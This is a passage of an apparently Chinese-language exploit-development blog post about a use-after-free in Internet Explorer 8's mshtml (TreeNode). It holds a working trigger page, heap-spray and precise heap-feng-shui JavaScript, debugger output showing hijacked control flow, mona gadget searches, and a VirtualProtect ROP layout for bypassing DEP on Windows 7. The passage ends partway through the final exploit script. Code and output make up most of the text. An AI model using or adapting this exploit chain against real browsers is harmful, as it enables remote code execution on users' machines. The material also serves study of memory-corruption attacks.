<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dc 02f123a8</span><br><span class="line">02f123a8  22221111 44443333 22221111 44443333  ..&quot;&quot;33DD..&quot;&quot;33DD</span><br><span class="line">02f123b8  22221111 44443333 22221111 44443333  ..&quot;&quot;33DD..&quot;&quot;33DD</span><br><span class="line">02f123c8  22221111 44443333 22221111 44443333  ..&quot;&quot;33DD..&quot;&quot;33DD</span><br><span class="line">02f123d8  22221111 44443333 22221111 44443333  ..&quot;&quot;33DD..&quot;&quot;33DD</span><br></pre></td></tr></table></figure>
<p>注意：建议覆写部分不要使用0c0c0c0c作为数据，因为后期使用精确堆喷射的时候，我们会修改0c0c0c0c地址的值，这样覆盖虚表地址为0c0c0c0c，而0c0c0c0c地址存放的并不是0c0c0c0c而是我们shellcode的开头。</p>
<p>继续运行，程序断在了GetInterface+0xac的位置，eax已经被赋值为了0x0c0c0c0c，说明这里调用了我们被释放的对象TreeNode。也就是我们占位成功，并且赋值给EAX。</p>
<p>不过这里还不是我们控制EIP的漏洞代码，因为这里[eax]不存在值所以程序就断下来了(EAX此时指向的应该是TreeNode虚函数表指针)。</p>
<p>接下来我们使用堆喷射将这段内存填充满值（0c0c0c0c）。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/QOXXoe.png" alt="QOXXoe"> </p>
<p>我们增加一个HeapSpray函数，准备好堆喷射，具体堆喷射细节可以参考前辈给出的利用总结（下图）。此时再次运行我们的程序。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/C5J4Oj.png" alt="C5J4Oj"> </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">exp.html</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">​	&lt;title&gt;Migraine&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">​	Hello World!</span><br><span class="line">	&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">​		<span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">​		</span>&#123;</span><br><span class="line">​			<span class="built_in">Math</span>.tan(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">​			<span class="keyword">var</span> father=<span class="built_in">document</span>.createElement(<span class="string">&quot;father&quot;</span>);</span><br><span class="line">​			<span class="keyword">var</span> child=<span class="built_in">document</span>.createElement(<span class="string">&quot;child&quot;</span>);</span><br><span class="line">​			<span class="built_in">Math</span>.tan(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			<span class="built_in">document</span>.body.appendChild(father);</span><br><span class="line">​			<span class="built_in">document</span>.body.appendChild(child);</span><br><span class="line">​			<span class="built_in">Math</span>.sin(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			child.applyElement(father);</span><br><span class="line"></span><br><span class="line">​			father.onlosecapture=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">​				Heapspray();</span><br><span class="line">​				<span class="built_in">document</span>.write(<span class="string">&quot;&quot;</span>);</span><br><span class="line">​				<span class="comment">//Math.cos(1,2);</span></span><br><span class="line">​				tt = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">20</span>);</span><br><span class="line">​    			<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; tt.length; i++) &#123;</span><br><span class="line">​      			tt[i] = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">​      			tt[i].className = <span class="string">&quot;\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u2222\u3333\u4444\u1111&quot;</span>;<span class="comment">//替代\0c</span></span><br><span class="line">​    			&#125;</span><br><span class="line">​    			<span class="built_in">Math</span>.sin(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​				<span class="comment">//alert(&quot;123&quot;);</span></span><br><span class="line">​			&#125;</span><br><span class="line"></span><br><span class="line">​			<span class="built_in">Math</span>.cos(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			father[<span class="string">&#x27;outerText&#x27;</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">​			<span class="built_in">Math</span>.cos(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			father.setCapture();</span><br><span class="line">​			child.setCapture();</span><br><span class="line"></span><br><span class="line">​			<span class="function"><span class="keyword">function</span> <span class="title">Heapspray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">​			</span>&#123;</span><br><span class="line">​				<span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">​				shellcode=<span class="string">&quot;\u1234\u3456\u7890\u1234\u3456\u7890&quot;</span>;</span><br><span class="line">​				block=<span class="string">&quot;\u0c0c\u0c0c&quot;</span></span><br><span class="line">​				<span class="keyword">while</span>(block.length&lt;<span class="number">0x100000</span>)</span><br><span class="line">​					block+=block;</span><br><span class="line">​				block=block.substring(<span class="number">0</span>,<span class="number">0x100000</span>/<span class="number">2</span>-<span class="number">32</span>/<span class="number">2</span>-<span class="number">4</span>/<span class="number">2</span>-<span class="number">2</span>/<span class="number">2</span>-shellcode.length);</span><br><span class="line">​				block+=shellcode;</span><br><span class="line">​				<span class="keyword">var</span> memory=<span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">​				<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">600</span>;i++)</span><br><span class="line">​					memory[i]=block.substring(<span class="number">0</span>,block.length);</span><br><span class="line">​			&#125;</span><br><span class="line">​		&#125;</span><br><span class="line">​		<span class="built_in">window</span>.setTimeout(<span class="string">&quot;trigger()&quot;</span>,<span class="number">1000</span>);</span><br><span class="line">​	&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/6WBklB.png" alt="6WBklB"><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/W9TYgu.png" alt="W9TYgu"> </p>
<p>程序跳转到了0x0c0c0c0c，通过栈回溯，很明显是在GetInterface函数中调用call [ecx]，读取了TreeNode对象中的内容，完成了一次堆EIP的控制。</p>
<p>注：ECX的值来源</p>
<p>向前阅读，发现上一次运行的断点就在向上5行(详细情况读者可以看本文的上一小节)，根据上文的分析mov ecx,[eax]此时的EAX的值是从被我们覆盖的TreeNode中读取的（已经被我们覆盖为了0c0c0c0c）。从EAX指向的地址读取字符给ECX，而堆空间中已经被堆满了0c0c0c0c，因此导致ECX也被赋值为了0c0c0c0c地址存放的数据（也是0c0c0c0c）。然后call [ecx]就发生了。</p>
<p>需要注意的是，在后期利用占位使用的字符尽量不要使用0c0c0c0c，因为这个空间会被我们安排ROP链，会导致[EAX]不能给ECX赋正确的值。（0c0c0c0c）</p>
<p> <img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/AtoXvh.png" alt="AtoXvh"></p>
<p>通过利用这个UAF漏洞，我们最后成功控制了程序流。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/LiRjWN.png" alt="LiRjWN"></p>
<p><img src="https://s2.ax1x.com/2019/11/07/MA6aHP.png" alt="img"> </p>
<h3 id="2-1-2-漏洞利用泛谈"><a href="#2-1-2-漏洞利用泛谈" class="headerlink" title="2.1.2 漏洞利用泛谈"></a>2.1.2 漏洞利用泛谈</h3><p>UAF的部分到这里已经结束了。用大佬的说的一句话，就是漏洞和程序编写者有关，与系统无关。UAF漏洞是mshtml的一个内存漏洞，由漏洞能控制程序流。只要没有补丁，IE8在WinXP或者WIN10下，这个漏洞都是存在的。</p>
<p>区别在于利用难度，WIN XP SP1没有DEP，所以堆喷射一下就解决了。WIN 10开启了很复杂的保护，每周还有更新，利用难度非常高。</p>
<p>谈这点是的主要目的是什么呢，主要就是想表达自己最近领悟的一个观点。漏洞是客观存在的，与我们在什么系统下执行无关。能够利用，可能就要考验利用者的手法了。所以希望读者能明白，如果希望实现你UAF，那么原理和案例看到这里就够了。</p>
<p>并不是说利用手法不重要，而是希望自己能够对漏洞概念有一个更深刻的领会。</p>
<p>下文将尝试在WIN7下的对这个漏洞进行利用，使用ROP和精确堆喷射绕过DEP防护。</p>
<p>WIN7下的利用分析</p>
<p>使用mona插件，可以非常明显发现IE开启了DEP（IE本身没有开，但是mshtml开了），导致堆内的空间也不可执行。如果是XP环境，shellcode会被直接执行，但是在这里就需要使用ROP来绕过DEP。ASLR因为需要重启才会导致基础地址发生变化，所以我们本地测试暂时不做讨论。</p>
<p>绕过DEP的一般操作就是使用VirtualProtect关闭DEP，可以使用x kernel32!Virtual*查找这个函数的位置。如果ASLR的影响算在内，函数地址也不是稳定的。（kernel32的地址也会变化）</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/sVNpzM.png" alt="sVNpzM"> </p>
<p>在正式开始利用前，我们先做一个小实验：</p>
<p>在HeapSpray执行之后，查看0c0c0c0c的内存空间，发现已经被覆盖。</p>
<p>使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed &lt;address&gt; data</span><br></pre></td></tr></table></figure>
<p>我们将0c0c0c0c地址的数据修改成了VirtualProtect的地址。</p>
<p> <img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/hx5wXH.png" alt="hx5wXH"></p>
<p>成功跳转进入了函数。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/1VKUE4.png" alt="1VKUE4"></p>
<h3 id="2-1-3精确堆喷射"><a href="#2-1-3精确堆喷射" class="headerlink" title="2.1.3精确堆喷射"></a>2.1.3精确堆喷射</h3><blockquote>
<p>目前需要解决的问题有二</p>
<p>一是我们的数据包括shellcode和ROP链是存放在堆中的，熟悉ROP的读者应该明白只有在栈中（或者伪造的栈）才能正常执行程序链。</p>
<p>二是程序开启了DEP，堆不可执行，除非ROP链的头部正好对准0c0c0c0c（或者我们制定的其他跳转地址），才能正常执行ROP，一个字节也不能差。但是堆喷射是一种不稳定的技术，ROP链的地址在堆中位置是不确定。</p>
</blockquote>
<p>解决方案：</p>
<p>因为我们将ROP布置在堆中，不能像栈一样方便直接执行。这里可使用栈翻转技术解决，将ESP指向我们堆中的ROP，就和在栈中没有区别了。前文我们已经尝试了在0c0c0c0c的位置布置了一个指向VirtualProtect函数的指针，并且成功跳转了，目前只需要布置好ROP就行。</p>
<p>那就第二个问题，如何在将ROP链的头精确的放在0c0c0c0c的位置。具体细节可以阅读下面这两篇文章。关键字：精确堆喷射。通过这个技术我们能将ROP精准地对准0c0c0c0c。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huhu1544/article/details/9821735">链接1</a></p>
<p><a target="_blank" rel="noopener" href="http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html">链接2</a></p>
<p>HeapSpray.html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">​	&lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">​	var sc&#x3D;&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;</span><br><span class="line">​	var nop&#x3D;&quot;\u0c0c\u0c0c&quot;;</span><br><span class="line">​	while(nop.length&lt;0x100000)</span><br><span class="line">​		nop+&#x3D;nop;</span><br><span class="line">​	nop&#x3D;nop.substring(0,(0x80000-6)&#x2F;2-sc.length);</span><br><span class="line">​	code&#x3D;sc+nop;</span><br><span class="line">​	heap_chunks&#x3D;new Array();</span><br><span class="line">​	for(i&#x3D;0;i&lt;1000;i++)</span><br><span class="line">​	&#123;</span><br><span class="line">​		heap_chunks[i]&#x3D;code.substring(0,code.length);</span><br><span class="line">​	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>查看0c0c0c0c的内存发现成功覆盖，但是我们需要到是能精准对将ROP链&#x2F;Shellcode的头部对准0c0c0c0c的位置。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/RZruTJ.png" alt="RZruTJ"> </p>
<p>查看0c0c0c0c堆块的堆头为0c0a0018。一个堆块对应我们使用JS分配的8MB的heap_chunk。</p>
<p>而UserPtr也就数据存放的开头为0c0a0030(一般来说是0c010020但是我调试时开了Enable heap tagging)，查看这个区域我们输入数据头部就是从UserPtr+8的位置开始的。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/PPJEwW.png" alt="PPJEwW"><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/mfYW6p.png" alt="mfYW6p"> </p>
<p>可以看出堆空间的起始地址的最后四位都变成了0018，UserPtr的最后四位则为0030.</p>
<p>这是在大量分配内存之后会产生的现象。</p>
<p>虽然每次分配的值地址不一定完全相同，比如第一次0c0c0c0c所在用户堆起始地址为0c0a0030，偏移为0x20bdc，而第二次则为0c0b0030，偏移为0x10bdc。</p>
<p>但是变化范围都是以0x10000为基数的，只需要在heap_chunk中以0x10000为单位配置好shellcode+nops的格式。最后heap_chunk整体加上偏移地址0xbdc，无论地址怎么变化，都能顺利让0c0c0c0c指向函数shellocode的起始地址。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/pMuSXH.png" alt="pMuSXH"> </p>
<p>修改HeapSpray,成功利用heap-feng-shui技术将0c0c0c0c的位置精确定为我们shellcode的起始地址。代码如下。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/7Db3lP.png" alt="7Db3lP"> </p>
<p>可以看到我们内存中每隔0x1000都会存在一个shellcode+nop的结构。这样能让0c0c0c0c具有某种程度上的稳定。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/7JHx2w.png" alt="7JHx2w"> </p>
<p>HeapSpray.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">​	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">​	<span class="keyword">var</span> sc=<span class="string">&quot;\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141&quot;</span>;</span></span><br><span class="line"><span class="javascript">​	<span class="keyword">var</span> nop=<span class="string">&quot;\u0c0c\u0c0c&quot;</span>;</span></span><br><span class="line"><span class="javascript">​	<span class="keyword">var</span> offset=<span class="number">0x5ee</span>-<span class="number">4</span>/<span class="number">2</span>;<span class="comment">//0xbdc/2-4/2</span></span></span><br><span class="line"><span class="javascript">​	<span class="comment">//以0x10000为单位的shellcode+nop结构单元</span></span></span><br><span class="line"><span class="javascript">​	<span class="keyword">while</span>(nop.length&lt;<span class="number">0x10000</span>)</span></span><br><span class="line">​		nop+=nop;</span><br><span class="line"><span class="javascript">​	<span class="keyword">var</span> nop_chunk=nop.substring(<span class="number">0</span>,(<span class="number">0x10000</span>/<span class="number">2</span>-sc.length)); <span class="comment">//Unicode编码，所以0x10000/2个字节</span></span></span><br><span class="line"><span class="javascript">​	<span class="keyword">var</span> sc_nop=sc+nop_chunk;</span></span><br><span class="line"><span class="javascript">​	<span class="comment">//组合成单个大小为0x80000的堆块（heap-feng-shui)</span></span></span><br><span class="line"><span class="javascript">​	<span class="keyword">while</span>(sc_nop.length&lt;<span class="number">0x100000</span>)</span></span><br><span class="line">​		sc_nop+=sc_nop;</span><br><span class="line"><span class="javascript">​	sc_nop=sc_nop.substring(<span class="number">0</span>,(<span class="number">0x80000</span>-<span class="number">6</span>)/<span class="number">2</span>-offset);<span class="comment">//组合成0x800000的堆块</span></span></span><br><span class="line"><span class="javascript">​	<span class="keyword">var</span> offset_pattern=nop.substring(<span class="number">0</span>,offset); </span></span><br><span class="line">​	code=offset_pattern+sc_nop;</span><br><span class="line"><span class="javascript">​	heap_chunks=<span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript">​	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)</span></span><br><span class="line">​	&#123;</span><br><span class="line">​		heap_chunks[i]=code.substring(0,code.length);</span><br><span class="line">​	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将这段代码替换poc中的heapspray函数，运行poc发现，程序成功跳转到41414141的位置。（因为0c0c0c0c地址已经被AAAA覆盖）</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/aHawbO.png" alt="aHawbO"> </p>
<p>接下来只需要构造ROP链，使用VirtualProtect函数将0c0c0c0c开始的内存设置为可执行即可。大概参数可以</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">shellcode 所在内存空间起始地址,</span></span></span><br><span class="line"><span class="function"><span class="params">shellcode 大小,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">0x40</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">某个可写地址</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>; </span><br></pre></td></tr></table></figure>


<p>可以使用mona插件快速寻找gadgets</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!py mona findwild -s &quot;mov esp,eax#*#retn&quot;</span><br><span class="line">0x760f0b51 |   0x760f0b51 (b+0x002b0b51)  : mov esp,eax # dec ecx # retn</span><br><span class="line">0x760e0ae2 |   0x760e0ae2 (b+0x002a0ae2)  : mov esp,ecx # dec ecx # retn 4</span><br></pre></td></tr></table></figure>


<h3 id="2-1-4构造ROP链"><a href="#2-1-4构造ROP链" class="headerlink" title="2.1.4构造ROP链"></a>2.1.4构造ROP链</h3><p>翻转栈帧到堆空间</p>
<p>因为发生UAF之后，ESP指向的是当前的栈空间，而我们的rop链是放在heap里的。所以需要使用栈翻转，将esp指向我们堆中的rop链。这个部分也是非常有意思的。</p>
<p>步骤（0）首先eax是我们可控的参数（通过占位TreeNode），ecx的值来源为[eax],所以eax的值不能直接指向我们的rop链，因为这样ecx会读取不到正确的值，call [ecx]也就不能跳转。</p>
<p>步骤（1）ROP链头部必须执行栈翻转操作，否则rop链将无法成功执行。</p>
<p>看大佬的案例是寻找xchg指令，对esp进行赋值。但是我并没有找到很合适的gadget。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!py mona find -s &quot;\x94\xc3&quot; 或者!py mona.py findwild -s &quot;xchg esp,eax#*#retn&quot;</span><br><span class="line">0x736c32fa |   0x736c32fa (b+0x000132fa)  : \x94\xc3 </span><br></pre></td></tr></table></figure>
<p>不过上穷水尽疑无路，柳暗花明又一村。我们找到了一组包含pop esp的gadget，可以修改esp为0c0c0c0c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!py mona.py findwild -s &quot;push ecx#*#pop esp#*#retn&quot;</span><br><span class="line">0x75b48d9e |   0x75b48d9e (b+0x00398d9e)  : push ecx # pop esp # pop ebp # retn 4</span><br></pre></td></tr></table></figure>

<p>步骤（2）上一个步骤执行到ret命令时，esp&#x3D;0c0c0c10，所以在0c0c0c10起始埋下我们到ROP链接就行。</p>
<p>步骤（3）ROP设置shellcode内存可执行之后，跳转到shellcode运行即可。</p>
<p>ROP流程图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Heap	</span><br><span class="line">(0) Reg  eip-&gt;0c0c0c0c ecx&#x3D;0c0c0c0c eax&#x3D;0c0c0c04 esp&#x3D;&gt;stack</span><br><span class="line">(1)&#x3D;&gt;0c0c0c0c  push ecx#pop esp#..#ret 4  &#x3D;&gt;  esp&#x3D;0c0c0c0c+4&#x3D;&gt;heap</span><br><span class="line">(2)&#x3D;&gt;0c0c0c10 ret &#x3D;&gt;esp&#x3D;0c0c0c10+4+4(因为ret4) </span><br><span class="line">0c0c0c14 0c0c0c0c (跳过4字节)</span><br><span class="line">(3)&#x3D;&gt;0c0c0c18  VirtualProtect_addr &#x3D;&gt;esp&#x3D;0c0c0c10-&gt;0c0c0c18(因为ret4)</span><br><span class="line">0c0c0c1c shellcode_addr -&gt;0c0c0c30</span><br><span class="line">0c0c0c20  0c0c0c00 [arg4]</span><br><span class="line">0c0c0c24  0x1000 [arg3]</span><br><span class="line">0c0c0c28  0x40 [arg2]</span><br><span class="line">0c0c0c2c  0c0c0c0c[arg1]</span><br><span class="line">(3)	0c0c0c30 shellcode</span><br></pre></td></tr></table></figure>

<p>编写出EXP利用脚本</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">​	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Migraine<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">​	Hello World!</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">​		<span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>)</span></span></span><br><span class="line">​		&#123;</span><br><span class="line"><span class="javascript">​			<span class="built_in">Math</span>.tan(<span class="number">2</span>,<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">​			<span class="keyword">var</span> father=<span class="built_in">document</span>.createElement(<span class="string">&quot;father&quot;</span>);</span></span><br><span class="line"><span class="javascript">​			<span class="keyword">var</span> child=<span class="built_in">document</span>.createElement(<span class="string">&quot;child&quot;</span>);</span></span><br><span class="line"><span class="javascript">​			<span class="built_in">Math</span>.tan(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">​			<span class="built_in">document</span>.body.appendChild(father);</span></span><br><span class="line"><span class="javascript">​			<span class="built_in">document</span>.body.appendChild(child);</span></span><br><span class="line"><span class="javascript">​			<span class="built_in">Math</span>.sin(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line">​			child.applyElement(father);</span><br><span class="line"></span><br><span class="line"><span class="javascript">​			father.onlosecapture=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line">​				Heapspray();</span><br><span class="line"><span class="javascript">​				<span class="built_in">document</span>.write(<span class="string">&quot;&quot;</span>);</span></span><br><span class="line"><span class="javascript">​				<span class="comment">//Math.cos(1,2);</span></span></span><br><span class="line"><span class="javascript">​				tt = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">20</span>);</span></span><br><span class="line"><span class="javascript">​    			<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; tt.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">​      			tt[i] = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="javascript">​      			<span class="comment">//tt[i].className = 